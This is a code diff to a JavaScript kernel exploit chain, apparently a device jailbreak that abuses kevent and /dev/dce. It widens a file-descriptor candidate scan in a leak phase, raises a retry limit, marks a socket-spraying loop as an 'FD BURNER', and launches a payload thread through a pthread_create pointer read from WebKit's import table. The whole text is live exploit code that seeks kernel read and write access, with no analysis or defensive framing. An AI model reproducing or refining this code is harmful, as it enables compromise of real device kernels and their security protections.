@@ -20,7 +20,9 @@ const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 
-const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
+// Dense CANDS array to scan every 4th slot up to 512
+const CANDS = [];
+for (let i = 0; i < 512; i += 4) CANDS.push(i);
 const ROUNDS = 6;
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
@@ -225,6 +227,7 @@ function phase2Leak(rootKq, fds) {
     for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
 
     for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
+      if (tries >= 512) break; // Raised limit
       const vi = CANDS[ci];
       if (vi >= fds.length) continue;
       const fd = fds[vi];
@@ -319,6 +322,7 @@ export async function runKevent(c) {
 
   ensureStubs();
 
+  // FD BURNER
   const burn = [];
   for (let i = 0; i < 250; i++) {
     const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
@@ -384,7 +388,6 @@ export async function runKevent(c) {
 
   log("STAGE4-RUN", "Spawning payload...");
   
-  // THE FIX: Use c.off to access the firmware offsets
   const pthread_create = ctx().p.read8(ctx().webkitBase.add32(c.off.wk___imp_pthread_create));
   const thr = new ArrayBuffer(8);
   c.keepAlive.push(thr);
